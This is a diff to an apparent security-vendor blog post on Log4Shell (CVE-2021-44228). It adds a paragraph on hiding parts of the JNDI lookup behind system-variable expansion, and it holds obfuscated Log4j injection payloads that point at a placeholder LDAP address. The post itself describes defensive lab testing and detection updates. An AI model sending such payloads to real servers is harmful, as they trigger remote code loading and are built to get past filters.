@@ -107,7 +107,11 @@ We also observed that Unicode characters can be used to successfully exploit the
 
 `${${( ❛ ͜ʖ ❛ ):RandomValue:-j}ndi:ldap://<ip_address>/}`
 
-Both of these have been tested against a demo vulnerable setup that we have on our lab (based on https://github.com/christophetd/log4shell-vulnerable-app) and are using to monitor the evolution of attacker methods.
+Another obfuscation capability we have found is when parts of the URI can be hidden behind environment/system variables that will be dynamically expanded, for example:
+
+`${jndi${sys:path.separator}ldap://<ip_address>}`
+
+All of these have been tested against a demo vulnerable setup that we have on our lab (based on https://github.com/christophetd/log4shell-vulnerable-app) and are using to monitor the evolution of attacker methods.
 
 All our findings are also used to improve Forescout products and artifacts. eyeSight customers can install the Security Policy Templates (SPT) plugin version 21.0.11, which is scheduled to be released by December 17, 2021 while eyeInspect customers can update their Threat Detection Add-Ons script to version 1.6 (and above) containing a detection strategy for CVE-2021-44228 exploitation attempts on HTTP.
 
